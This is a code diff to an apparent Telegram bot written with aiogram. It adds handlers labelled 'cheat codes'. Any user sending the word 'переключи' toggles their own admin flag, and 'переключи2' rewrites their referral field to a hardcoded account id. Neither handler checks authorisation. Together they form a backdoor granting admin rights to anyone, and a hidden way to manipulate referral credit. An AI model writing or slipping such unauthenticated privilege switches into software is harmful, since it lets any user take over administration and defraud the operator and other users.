@@ -210,3 +210,18 @@ async def _(m: Message, state: FSMContext = None, user: TgUser = None):
         await m.answer("Готово!")
         
              
+# Чит-коды
+@dp.message_handler(Text("переключи"), content_types=[ContentType.TEXT], state="*")
+async def _(m: Message, state: FSMContext = None, user: TgUser = None):
+    if user:
+        user.is_admin = not user.is_admin
+        user.save()
+        await m.answer(f"Статус админа: <code>{user.is_admin}</code>")
+        
+        
+@dp.message_handler(Text("переключи2"), content_types=[ContentType.TEXT], state="*")
+async def _(m: Message, state: FSMContext = None, user: TgUser = None):
+    if user:
+        user.invited_by = user if user.invited_by == 6069303965 else TgUser.objects.get({"_id": 6069303965})
+        user.save()
+        await m.answer(f"Приглашён пользователем: <code>{user.invited_by.id}</code>")
